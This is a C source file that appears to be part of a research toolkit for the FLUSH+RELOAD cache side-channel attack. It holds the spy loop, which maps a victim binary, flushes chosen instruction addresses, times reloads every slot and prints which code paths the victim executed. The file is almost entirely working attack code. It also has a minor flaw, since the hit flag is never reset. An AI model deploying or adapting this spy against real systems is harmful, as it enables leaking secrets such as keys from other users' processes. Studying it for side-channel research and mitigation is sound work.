#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>
#include <limits.h>

#include "flushreload.h"
#include "cpuid.h"
#include "elftools.h"
#include "attacktools.h"
#include "exitcodes.h"

#define SLOT_BUF_SIZE 10000
#define MAX_QUIET_PERIOD 10000

typedef struct SlotState {
    unsigned long long start;
    unsigned long missed;
    unsigned long probe_time[MAX_PROBES];
} slot_t;

void checkSystemConfiguration();
void printSlotBuffer(slot_t *buffer, unsigned long size, args_t *args);
void attackLoop(args_t *args);

void startSpying(args_t *args)
{
    /* Warn the user if the attack might not work on this system. */
    checkSystemConfiguration();

    /* Find the virtual address the victim binary gets loaded at. */
    unsigned long load_address = elf_get_load_address(args->elf_path);
    if (load_address == ULONG_MAX) {
        exit(EXIT_FAILURE);
    }

    /* Map the victim binary into our address space. */
    unsigned long size;
    const char *binary = map(args->elf_path, &size);

    /* Construct pointers to the probe addresses. */
    int i = 0;
    for (i = 0; i < args->probe_count; i++) {
        probe_t *probe = &args->probes[i];
        if (probe->virtual_address < load_address) {
            fprintf(stderr, "Virtual address 0x%lx is too low.\n", probe->virtual_address);
            exit(EXIT_BAD_ARGUMENTS);
        }
        if (probe->virtual_address >= load_address + size) {
            fprintf(stderr, "Virtual address 0x%lx is too high (%lx, %lx).\n", probe->virtual_address, load_address, size);
            exit(EXIT_BAD_ARGUMENTS);
        }
        probe->mapped_pointer = binary + (probe->virtual_address - load_address);
    }

    /* Start the attack. */
    attackLoop(args);
}

void checkSystemConfiguration()
{
    if (!cpuid_has_invariant_tsc()) {
        printf("WARNING: This processor does not have an invariant TSC.\n");
    }

    char vendor[12];
    cpuid_get_vendor_string(vendor);
    if (memcmp("GenuineIntel", vendor, 12) != 0) {
        printf("WARNING: This is not an Intel processor.\n");
    }

    /* TODO: Warn when there are more than one physical processors on the
     * motherboard (not cores). I'm not going to do this yet because I don't
     * have a multi-processor system to test with. */
}

void attackLoop(args_t *args)
{
    unsigned int threshold = args->threshold;
    probe_t *probes = args->probes;
    unsigned int i;
    unsigned long quiet_length = 0;
    unsigned long hit = 0;

    slot_t buffer[SLOT_BUF_SIZE];
    unsigned long buffer_pos = 0;

    unsigned long long current_slot_start = 0;
    unsigned long long current_slot_end = 0;
    unsigned long long last_completed_slot_end = 0;

    /* Setup: flush all of the probes. */
    for (i = 0; i < args->probe_count; i++) {
        flush(probes[i].mapped_pointer);
    }

    /* FIXME: Think about re-defining a slot so the probe comes at the end. */

    /* Attack loop. We're trying for 1 slot per iteration. */
    last_completed_slot_end = (gettime() / args->slot) * args->slot;
    while (1) {
        /* This slot will be considered to start at the last time that was
         * divisible by the slot size. */
        current_slot_start = (gettime() / args->slot) * args->slot;
        /* This slot will end at the next time divisible by the slot size. */
        current_slot_end = current_slot_start + args->slot;

        /* Save the slot start. */
        buffer[buffer_pos].start = current_slot_start;
        /* Calculate the number of slots we missed. */
        buffer[buffer_pos].missed = (current_slot_start - last_completed_slot_end) / args->slot;

        /* Stop if RDTSC ever fails to be monotonic. */
        if (current_slot_start < last_completed_slot_end) {
            printf("Monotonicity failure!!!\n");
            printf("Current Start: %llu. Last end: %llu\n", current_slot_start, last_completed_slot_end);
            exit(EXIT_MONOTONICITY);
        }

        /* Measure and reset the probes from the PREVIOUS slot. */
        for (i = 0; i < args->probe_count; i++) {
            buffer[buffer_pos].probe_time[i] = probe(probes[i].mapped_pointer);
            /* We don't make the hit decision yet, we do that when we print the
             * buffer. */
            if (buffer[buffer_pos].probe_time[i] <= args->threshold) {
                hit = 1;
            }
        }

        /* If we got a hit, reset the quiet streak length. */
        if (hit) {
            quiet_length = 0;
        } else {
            quiet_length++;
        }

        /* Wait for this slot to end. */
        while (gettime() < current_slot_end) {
            /* Busy wait. */
        }

        /* Indicate that *this* slot has finished. */
        last_completed_slot_end = current_slot_end;

        /* Advance to the next time slot. */
        buffer_pos++;

        /* FIXME: quiet and buffer doesn't work exactly as I think it does,
         * because the buffer contains uneventful (no hits) slots...
         * So, the buffer will *always* exhaust itself?
         */

        /* If we've reached the end of the buffer, dump it. */
        if (buffer_pos >= SLOT_BUF_SIZE) {
            printSlotBuffer(buffer, buffer_pos, args);
            buffer_pos = 0;
        }

        /* Or, if it's been quiet for a while, do it now. */
        if (buffer_pos >= 1 && quiet_length >= MAX_QUIET_PERIOD) {
            printSlotBuffer(buffer, buffer_pos, args);
            buffer_pos = 0;
        }
    }
}

void printSlotBuffer(slot_t *buffer, unsigned long size, args_t *args)
{
    unsigned int i, j, hit, any_hit = 0;
    for (i = 0; i < size; i++) {
        hit = 0;
        for (j = 0; j < args->probe_count; j++) {
            if (buffer[i].probe_time[j] <= args->threshold) {
                printf("%c", args->probes[j].name);
                hit = 1;
            }
        }
        if (hit) {
            printf("|");
            if (buffer[i].missed > 0) {
                printf("{%lu}", buffer[i].missed);
            }
            any_hit = 1;
        }
    }
    if (any_hit) {
        printf("\n");
        fflush(stdout);
    }
}

